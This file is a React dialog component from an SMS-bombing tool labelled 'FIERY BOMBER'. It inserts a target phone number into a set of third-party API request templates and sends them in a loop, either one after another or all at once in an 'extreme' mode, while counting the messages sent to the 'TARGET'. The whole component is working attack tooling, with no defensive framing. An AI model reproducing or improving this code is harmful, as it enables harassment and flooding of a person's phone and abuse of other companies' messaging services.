import * as React from 'react';
import Button from '@mui/material/Button';
import Dialog from '@mui/material/Dialog';
import Box from '@mui/material/Box';
import DialogActions from '@mui/material/DialogActions';
import DialogContent from '@mui/material/DialogContent';
import CircularProgress from '@mui/material/CircularProgress';
import LocalFireDepartmentIcon from "@mui/icons-material/LocalFireDepartment";
import Table from '@mui/material/Table';
import Typography from '@mui/material/Typography';
import TableBody from '@mui/material/TableBody';
import TableHead from '@mui/material/TableHead';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableRow from '@mui/material/TableRow';
import Paper from '@mui/material/Paper';
import DialogTitle from '@mui/material/DialogTitle';
import Slide from '@mui/material/Slide';
import LinearProgress from '@mui/material/LinearProgress';
import axios from 'axios';

const Transition = React.forwardRef(function Transition(props, ref) {
  return <Slide direction="up" ref={ref} {...props} />;
});

export default function AlertDialogSlide({ open, setOpen, apis, fields, mode, hasClicked }) {
  const [totalSent, setTotalSent] = React.useState(0);
  const [isRunning, setIsRunning] = React.useState(true);
  const [isDone, setIsDone] = React.useState(false);
  const [currApi, setCurrApi] = React.useState("");
  const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  const handleDialogClose = () => {
    setOpen(false);
    setIsRunning(false);
  };

  const toggleBombing = () => {
    setIsRunning(!isRunning);
  }

  const transform_config = (number, config) => {

    const replace_all_headers = (headers, number) => {
      let new_headers = {};
      new_headers = {
        ...new_headers,
        ...(Object.keys(headers).map(key => {
          return [{
            [key.replace('_MSISDN_', number)]: headers[key].replace('_MSISDN_', number)
          }]
        }))
      }
      return headers;
    }

    let newConfig = {
      url: config.url.replace("_MSISDN_", number),
      headers: replace_all_headers(config.headers, number),
      body: config.body.replace("_MSISDN_", number),
      method: config.method
    }

    return newConfig;
  }

  const doRequest = (number, config) => {
    let ready_config = transform_config(number, config);
    return new Promise((resolve, reject) => {
      axios(ready_config).then(data => {
        resolve(data);
      }).catch(err => {
        reject(new Error(err));
      })
    });
  }


  const relaxedBomber = async (apis) => {
    let counter = 0;
    while (counter <= fields.amount) {
      for (const api of apis) {
        setCurrApi(api.name);
        if (counter >= fields.amount) {
          return
        } else {
          await doRequest(fields.number, api.config)
            .then(data => {
              setTotalSent(totalSent => totalSent + 1);
            }).catch(err => {
              setTotalSent(totalSent => totalSent + 1);
            })
          counter++
        }
      }
    }
  }

  const extremeBomber = (apis) => {
    let counter = 0;
    while (counter <= fields.amount) {
      for (const api of apis) {
        if (counter >= fields.amount) {
          return
        } else {
          doRequest(fields.number, api.config)
            .then(data => {
              setTotalSent(totalSent => totalSent + 1);
            }).catch(err => {
              setTotalSent(totalSent => totalSent + 1);
            })
          counter++
        }
      }
    }
  }

  React.useEffect(() => {
    if ((totalSent * 100) / fields.amount > 99) {
      setIsDone(true);
    }
  }, [totalSent])

  React.useEffect(() => {
    if (mode === 'relaxed') {
      relaxedBomber(apis)
    } else {
      extremeBomber(apis)
    }
  }, [])

  return (
    <Box>
      <Dialog
        open={open}
        TransitionComponent={Transition}
        keepMounted
        aria-describedby="alert-dialog-slide-description"
      >
        {!isDone && <LinearProgress sx={{ backgroundColor: '#151515' }} />}
        <DialogTitle align="center"><LocalFireDepartmentIcon sx={{ pt: 1 }} /> FIERY BOMBER <LocalFireDepartmentIcon sx={{ pt: 1 }} /></DialogTitle>
        <DialogContent>
          <Box sx={{ position: 'relative', display: 'flex', justifyContent: 'center' }}>
            <CircularProgress variant="determinate" value={(totalSent * 100) / fields.amount} />
            <Box
              sx={{
                top: 0,
                left: 0,
                bottom: 0,
                right: 0,
                position: 'absolute',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
              }}
            >
              <Typography variant="caption" component="div" color="text.secondary">
                {`${Math.round((totalSent * 100) / fields.amount)}%`}
              </Typography>
            </Box>
          </Box>
          <TableContainer component={Paper}>
            <Table size="small" aria-label="a dense table">
              <TableHead>
                <TableRow>
                  <TableCell colSpan={2} align="center">{mode.toUpperCase()} MODE</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {(mode === 'relaxed') && !isDone && <TableRow>
                  <TableCell component="th" scope="row">
                    CURRENT API
                  </TableCell>
                  <TableCell align="right">{currApi}</TableCell>
                </TableRow>}
                <TableRow>
                  <TableCell component="th" scope="row">
                    SMS SENT
                  </TableCell>
                  <TableCell align="right">{totalSent}</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell component="th" scope="row">
                    AMOUNT
                  </TableCell>
                  <TableCell align="right">{fields.amount}</TableCell>
                </TableRow>
                <TableRow>
                  <TableCell component="th" scope="row">
                    TOTAL APIs
                  </TableCell>
                  <TableCell align="right">{apis.length}</TableCell>
                </TableRow>
                <TableRow
                  sx={{ '&:last-child td, &:last-child th': { border: 0 } }}
                >
                  <TableCell component="th" scope="row">
                    TARGET
                  </TableCell>
                  <TableCell align="right">{fields.number}</TableCell>
                </TableRow>
              </TableBody>
            </Table>
          </TableContainer>

        </DialogContent>
        <DialogActions sx={{ display: 'flex', justifyContent: 'center' }}>
          <Button onClick={handleDialogClose} disabled={!isDone} variant="outlined">CLOSE</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}